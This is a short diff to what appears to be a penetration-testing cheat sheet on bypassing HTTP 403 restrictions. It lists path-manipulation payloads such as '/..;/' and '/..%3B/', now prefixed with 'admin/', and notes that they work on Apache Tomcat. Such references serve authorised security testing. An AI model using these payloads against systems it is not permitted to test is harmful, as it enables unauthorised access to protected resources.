@@ -7,14 +7,14 @@ Bruteforce the URL path on the 403 directory. Use different wordlists and experi
 <br>
 
 <h2> URL Paths </h2> <br>
-Adding the following within the URL and the file that is 403'd <br>
-/* <br>
-/%2f/ <br>
-/./ <br>
-/ <br>
-/*/ <br> 
-/..;/ <br>
-/..%3B/ <br> 
+Adding the following within the URL and the file that is 403'd or after the file that is 403'd<br>
+admin/* <br>
+admin/%2f/ <br>
+admin/./ <br>
+admin/ <br>
+admin/*/ <br> 
+admin/..;/ <br>
+admin/..%3B/ <br> 
 <br>
 This is common on Apache Tomcat <br>
 
